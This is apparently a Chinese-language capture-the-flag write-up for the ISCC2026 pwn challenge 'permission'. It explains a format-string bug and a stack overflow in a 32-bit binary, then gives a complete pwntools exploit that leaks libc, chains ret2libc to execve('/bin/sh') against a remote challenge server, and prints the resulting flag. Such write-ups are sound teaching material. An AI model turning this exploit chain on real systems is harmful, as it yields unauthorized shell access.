+++
title = "permission"
date = "2026-05-06"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++
附件是一个 32 位 ELF：

```bash
$ file attachment-9
attachment-9: ELF 32-bit LSB executable, Intel 80386, dynamically linked, not stripped
$ checksec --file=attachment-9
Partial RELRO    
No canary found    
NX enabled    
No PIE
```

### 1. `main` 里的格式化字符串

```c
read(0, buf, 0x20);
printf(buf);
if (target_val == 5) {
    vuln();
}
```
这里存在：
- `printf(buf)` 格式化字符串漏洞
- 全局变量 `target_val` 可被 `%n` 修改
所以第一步需要把 `target_val` 改成 `5`，进入 `vuln`。
### 2. `vuln` 里的栈溢出

```c
char buf[0x90];
read(0, buf, 0x100);
```
`0x90` 的缓冲区读入了 `0x100` 字节，存在明显栈溢出。
返回地址偏移为：
```python
offset = 0x94
```
## 利用思路
1. 先用格式化字符串把 `target_val` 改成 `5`
2. 进 `vuln` 后用 `write@plt` 泄露 libc
3. 再打 `ret2libc`

但远端有一个坑：**每次新连接的 libc 基址都不同**。  
如果用“多个连接泄露 + 新连接利用”，算出来的 `system` 地址会失效，最终就是 `Got EOF while reading in interactive`。

所以正确做法是：**同一连接里同时完成泄露和过关**。
### 最终利用链
第一次输入利用 `printf(buf)` 做两件事：
1. 泄露 `printf@got`
2. 用 `%hhn` 把 `target_val` 改成 `5`
这里选择泄露 `printf@got`，因为当前就在执行 `printf`，它的 GOT 已经被解析成真实 libc 地址；像 `write@got` 在这个时刻还可能只是 plt 跳板地址，不能直接拿来算 libc。
payload 结构：
```python
p32(printf_got) + p32(target_val) + b"%4$.4s%249c%5$hhn"
```
含义：
- 前 4 字节作为 `%4$` 的参数，配合 `%4$.4s` 精确读出 `printf@got` 的 4 字节内容
- 再用 `%249c` 控制当前输出字符数
- `%5$hhn` 把低 1 字节写到 `target_val`
- 
为什么是 `249`：
- 前面已经输出了 8 个原始地址字节
- `%4$.4s` 又输出 4 个泄露字节
- 总共已经输出 `12` 个字节
- 需要写成 `5`，而 `%hhn` 只看低 1 字节
- 所以补到 `0x105` 即可，`0x105 % 0x100 = 5`
- `0x105 - 12 = 249`

这样第一次输入结束后：
- 拿到 `printf` 的真实 libc 地址
- `target_val == 5`
- 程序进入 `vuln`

第二次输入直接栈溢出，走 `ret2libc`。

这里远端用 `system("/bin/sh")` 不稳定，直接 EOF；  
改成：
```c
execve("/bin/sh", 0, 0)
```
即可稳定拿 shell。
## Exp

```python
from pathlib import Path
from pwn import *
context.clear(arch="i386", os="linux", log_level="debug")
BASE_DIR = Path(__file__).resolve().parent
BIN_PATH = BASE_DIR / "attachment-9"
LIBC_PATH = BASE_DIR / "libc2318_extract" / "lib32" / "libc-2.31.so"
elf = ELF(str(BIN_PATH))
libc = ELF(str(LIBC_PATH))
HOST = "39.96.193.120"
PORT = 10000
OFFSET = 0x94
io = remote(HOST, PORT, timeout=5)
io.recvuntil(b"Hope you have a good time here.\n")
fmt = p32(elf.got["printf"]) + p32(elf.sym["target_val"]) + b"%4$.4s%249c%5$hhn"
io.send(fmt)
io.recvn(8)
printf_addr = u32(io.recvn(4))
log.success(f"printf = {hex(printf_addr)}")
libc.address = printf_addr - libc.sym["printf"]
execve_addr = libc.sym["execve"]
binsh_addr = next(libc.search(b"/bin/sh\x00"))
log.success(f"libc = {hex(libc.address)}")
log.success(f"execve = {hex(execve_addr)}")
log.success(f"binsh = {hex(binsh_addr)}")
io.recvuntil(b"Input:\n")
payload = flat(
    b"A" * OFFSET,
    execve_addr,
    0xDEADBEEF,
    binsh_addr,
    0,
    0,
)
io.send(payload)
io.interactive()
```
## Flag
```text
ISCC{e2d72fc8-fd71-4339-a79f-43a23013d374}
```
## 附件下载

- [attachment-9](attachment-9)

